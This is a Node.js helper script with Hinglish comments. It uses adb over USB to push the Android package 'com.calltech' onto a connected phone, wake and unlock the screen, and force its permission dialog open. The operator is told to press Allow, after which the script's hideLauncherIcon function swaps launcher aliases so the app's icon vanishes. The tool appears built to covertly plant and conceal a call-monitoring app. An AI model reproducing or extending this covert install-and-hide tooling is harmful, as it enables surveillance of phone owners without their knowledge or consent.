/**
 * Install ke baad USB se permission popup — user icon nahi dabata.
 * ColorOS: pehle Owner user 0 par package enable, phir am start.
 * HOME mat bhejo: permission dialog band ho jata hai.
 */
const {execSync} = require('child_process');
const {runOutput, ensurePackageForAllUsers} = require('./package-check');

const PACKAGE = 'com.calltech';
const ACTIVITY = `${PACKAGE}/.PermissionTrampolineActivity`;
const VISIBLE = `${PACKAGE}/.LauncherAlias`;
const HIDDEN = `${PACKAGE}/.HiddenAlias`;

function run(command) {
  try {
    execSync(command, {stdio: 'pipe', encoding: 'utf8'});
    return true;
  } catch (_error) {
    return false;
  }
}

function startOutput(command) {
  try {
    return execSync(command, {encoding: 'utf8', timeout: 15000, stdio: ['pipe', 'pipe', 'pipe']});
  } catch (error) {
    return `${error.stdout || ''}${error.stderr || ''}`;
  }
}

function sleepMs(ms) {
  const seconds = Math.max(1, Math.ceil(ms / 1000) + 1);
  try {
    execSync(`ping -n ${seconds} 127.0.0.1 > nul`, {stdio: 'ignore'});
  } catch (_error) {
    // ignore
  }
}

function hideLauncherIcon(deviceId) {
  run(`adb -s ${deviceId} shell pm enable --user 0 ${HIDDEN}`);
  run(`adb -s ${deviceId} shell pm disable-user --user 0 ${VISIBLE}`);
  run(`adb -s ${deviceId} shell pm disable ${VISIBLE}`);
}

function launchSucceeded(output) {
  const text = String(output || '').toLowerCase();
  return (
    text.includes('status: ok') ||
    text.includes('launchstate:') ||
    (text.includes('starting: intent') && !text.includes('error type') && !text.includes('does not exist'))
  );
}

function fakeLauncherTap(deviceId) {
  const starts = [
    `adb -s ${deviceId} shell am start -W --user 0 -n ${ACTIVITY} -a android.intent.action.MAIN -c android.intent.category.DEFAULT -f 0x10000000 --ez calltech_force_popup true`,
    `adb -s ${deviceId} shell am start -W --user 0 -n ${VISIBLE} -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -f 0x10008000`,
    `adb -s ${deviceId} shell monkey --user 0 -p ${PACKAGE} -c android.intent.category.LAUNCHER 1`,
  ];
  return starts.some(cmd => launchSucceeded(startOutput(cmd)));
}

function launchPermissionPopup(deviceId) {
  ensurePackageForAllUsers(deviceId, PACKAGE);

  run(`adb -s ${deviceId} shell svc power stayon usb`);
  run(`adb -s ${deviceId} shell input keyevent KEYCODE_WAKEUP`);
  run(`adb -s ${deviceId} shell wm dismiss-keyguard`);
  run(`adb -s ${deviceId} shell input keyevent 82`);
  run(`adb -s ${deviceId} shell pm enable --user 0 ${PACKAGE}/.PermissionTrampolineActivity`);
  run(`adb -s ${deviceId} shell pm enable --user 0 ${VISIBLE}`);
  run(`adb -s ${deviceId} shell pm disable-user --user 0 ${HIDDEN}`);

  sleepMs(500);

  let shown = false;
  for (let i = 0; i < 8 && !shown; i += 1) {
    shown = fakeLauncherTap(deviceId);
    if (!shown) {
      sleepMs(400);
    }
  }

  console.log(
    shown
      ? '  Permission popup USB se khul gaya — icon tap mat karo. Allow dabao, app hide ho jayegi.'
      : '  Popup start fail — Developer options: USB debugging (Security settings) ON.',
  );

  return shown;
}

module.exports = {
  PACKAGE,
  ACTIVITY,
  launchPermissionPopup,
  hideLauncherIcon,
};
